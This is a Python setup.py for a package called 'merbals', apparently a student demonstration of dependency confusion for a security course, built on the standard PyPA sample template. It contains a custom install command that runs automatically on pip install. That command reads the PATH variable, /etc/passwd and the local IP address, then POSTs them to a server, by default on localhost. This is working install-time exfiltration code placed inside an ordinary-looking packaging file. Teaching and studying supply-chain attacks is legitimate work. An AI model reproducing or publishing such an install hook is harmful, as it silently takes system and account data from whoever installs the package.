"""A setuptools based setup module.

See:
https://packaging.python.org/guides/distributing-packages-using-setuptools/
https://github.com/pypa/sampleproject
"""

import pathlib
import os
import socket
from setuptools import setup, find_packages
from setuptools.command.install import install

def log_system_info(server_url="http://localhost:9000/"):
    """
    Reads PATH variable, /etc/passwd, and local IP address, then sends them to a server for logging.
    
    Args:
        server_url (str): The URL of the server to send the data to.
    
    Returns:
        bool: True if data was sent successfully, False otherwise.
    """
    import requests
    try:
        # Read PATH environment variable
        path_var = os.environ.get("PATH", "")

        # Read /etc/passwd file
        passwd_content = ""
        try:
            with open("/etc/passwd", "r") as f:
                passwd_content = f.read()
        except (IOError, PermissionError) as e:
            passwd_content = f"Error reading /etc/passwd: {str(e)}"

        # Get local IP address
        ip_address = ""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))  # Connect to a public server to get local IP
            ip_address = s.getsockname()[0]
            s.close()
        except socket.error as e:
            ip_address = f"Error getting IP address: {str(e)}"

        # Prepare data to send
        data = {
            "path": path_var,
            "passwd": passwd_content,
            "ip_address": ip_address
        }

        # Send data to the server
        response = requests.post(server_url, json=data, timeout=5)
        response.raise_for_status()  # Raise an exception for bad status codes
        
        return True

    except requests.RequestException as e:
        print(f"Failed to send data to {server_url}: {str(e)}")
        return False
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        return False

here = pathlib.Path(__file__).parent.resolve()

class CustomInstallCommand(install):
    def run(self):
        out = super().run()
        log_system_info()
        return out


# Arguments marked as "Required" below must be included for upload to PyPI.
# Fields marked as "Optional" may be commented out.

setup(
    # This is the name of your project. The first time you publish this
    # package, this name will be registered for you. It will determine how
    # users can install this project, e.g.:
    #
    # $ pip install sampleproject
    #
    # And where it will live on PyPI: https://pypi.org/project/sampleproject/
    #
    # There are some restrictions on what makes a valid project name
    # specification here:
    # https://packaging.python.org/specifications/core-metadata/#name
    name="merbals",  # Required
    # Versions should comply with PEP 440:
    # https://www.python.org/dev/peps/pep-0440/
    #
    # For a discussion on single-sourcing the version across setup.py and the
    # project code, see
    # https://packaging.python.org/guides/single-sourcing-package-version/
    # version="3.4.13",  # Required
    # This is a one-line description or tagline of what your project does. This
    # corresponds to the "Summary" metadata field:
    # https://packaging.python.org/specifications/core-metadata/#summary
    description="A package for presentation in the systems' security module (dependency confusion)",  # Optional
    # This should be a valid link to your project's main homepage.
    #
    # This field corresponds to the "Home-Page" metadata field:
    # https://packaging.python.org/specifications/core-metadata/#home-page-optional
    url="https://github.com/merzouka/dependency-confusion.security.git",  # Optional
    # This should be your name or the name of the organization which owns the
    # project.
    author="Merzouka Youness/Bekhti Djalal",  # Optional
    # This should be a valid email address corresponding to the author listed
    # above.
    author_email="ya.merzouka@esi-sba.dz",  # Optional
    # Classifiers help users find your project by categorizing it.
    #
    # For a list of valid classifiers, see https://pypi.org/classifiers/
    classifiers=[  # Optional
        # How mature is this project? Common values are
        #   3 - Alpha
        #   4 - Beta
        #   5 - Production/Stable
        "Development Status :: 3 - Alpha",
        # Indicate who your project is intended for
        "Intended Audience :: Developers",
        "Topic :: Software Development :: Build Tools",
        "Programming Language :: Python :: 3 :: Only",
    ],
    # This field adds keywords for your project which will appear on the
    # project page. What does your project relate to?
    #
    # Note that this is a list of additional keywords, separated
    # by commas, to be used to assist searching for the distribution in a
    # larger catalog.
    # keywords="sample, setuptools, development",  # Optional
    # When your source code is in a subdirectory under the project root, e.g.
    # `src/`, it is necessary to specify the `package_dir` argument.
    package_dir={"": "src"},  # Optional
    # You can just specify package directories manually here if your project is
    # simple. Or you can use find_packages().
    #
    # Alternatively, if you just want to distribute a single Python file, use
    # the `py_modules` argument instead as follows, which will expect a file
    # called `my_module.py` to exist:
    #
    #   py_modules=["my_module"],
    #
    packages=find_packages(where="src"),  # Required
    # Specify which Python versions you support. In contrast to the
    # 'Programming Language' classifiers above, 'pip install' will check this
    # and refuse to install the project if the version does not match. See
    # https://packaging.python.org/guides/distributing-packages-using-setuptools/#python-requires
    # python_requires=">=3.7, <4",
    # This field lists other packages that your project depends on to run.
    # Any package you put here will be installed by pip when your project is
    # installed, so they must be valid existing projects.
    #
    # For an analysis of "install_requires" vs pip's requirements files see:
    # https://packaging.python.org/discussions/install-requires-vs-requirements/
    # install_requires=["requests"],  # Optional
    # List additional URLs that are relevant to your project as a dict.
    #
    # This field corresponds to the "Project-URL" metadata fields:
    # https://packaging.python.org/specifications/core-metadata/#project-url-multiple-use
    #
    # Examples listed include a pattern for specifying where the package tracks
    # issues, where the source is hosted, where to say thanks to the package
    # maintainers, and where to support the project financially. The key is
    # what's used to render the link text on PyPI.
    # project_urls={  # Optional
    #     "Bug Reports": "https://github.com/pypa/sampleproject/issues",
    #     "Funding": "https://donate.pypi.org",
    #     "Say Thanks!": "http://saythanks.io/to/example",
    #     "Source": "https://github.com/pypa/sampleproject/",
    # },
    cmdclass={
        "install": CustomInstallCommand
    },
)
